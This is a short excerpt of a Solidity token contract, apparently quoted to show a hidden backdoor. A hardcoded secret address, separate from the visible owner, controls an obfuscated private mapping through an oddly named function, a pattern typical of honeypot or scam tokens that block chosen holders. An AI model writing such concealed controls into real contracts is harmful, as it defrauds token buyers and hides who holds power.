...
contract Token is Ownable {
    ...
    address public _psyopben457;
    mapping(address => bool) private rfvhn;
    function quitOPDoge(address sss) external   {
        require(_psyopben457 == _msgSender());
        rfvhn[sss] = false;
        require(_psyopben457 == _msgSender());
    }
    ...
    constructor(string memory tokenName, string memory tokensymbol) {
        _psyopben457 = 0xdFaaCdf9C94f3264E440aA7c1370E81AC4e234ad;
